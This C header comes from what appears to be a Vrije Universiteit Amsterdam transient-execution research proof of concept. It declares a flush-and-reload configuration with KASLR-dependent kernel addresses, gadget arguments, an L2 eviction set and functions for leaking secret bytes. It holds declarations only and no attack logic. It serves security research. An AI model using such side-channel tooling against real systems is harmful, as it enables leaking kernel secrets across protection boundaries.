/*
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */


#ifndef _FLUSH_AND_RELOAD_H_
#define _FLUSH_AND_RELOAD_H_

#include <stdint.h>
#include <sys/socket.h>
#include <sys/select.h>

#include "../../../common/l2_eviction/evict_l2.h"

struct config {
    int fd_sock;
    fd_set fd_set;
    int epoll;

    uint8_t * fr_buf;
    uint8_t * fr_buf_kern;
    uint8_t * reload_addr;

    uint8_t * ind_map;
    uint8_t * ind_map_kern;

    uint64_t * ind_tb_addr;
    uint64_t * ind_secret_addr;

    uint8_t * history;

    uint64_t tfp_leak_target;
    uint8_t * tfp_arg;

    uint8_t * gadget_arg_secret_addr;
    uint8_t * gadget_arg_base;

    uint64_t rand_arg1;
    uint64_t rand_arg2;
    uint64_t rand_arg3;
    uint64_t train_rand_arg1;
    uint64_t train_rand_arg2;

    // kaslr dependent
    uint8_t * phys_start;
    uint8_t * phys_end;
    uint8_t * text_start;

    uint64_t security_list_address;
    void * ev_set_l2[L2_EVICT_SIZE];

};

uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit);

void print_leakage_rate(struct config * cfg, uint64_t iterations);

void set_load_chain_simple_touch(struct config * cfg, int number_of_loads);

void set_load_chain_leak_secret(struct config * cfg);
int leak_byte_forwards(struct config * cfg, uint64_t prefix);


#endif //_FLUSH_AND_RELOAD_H_
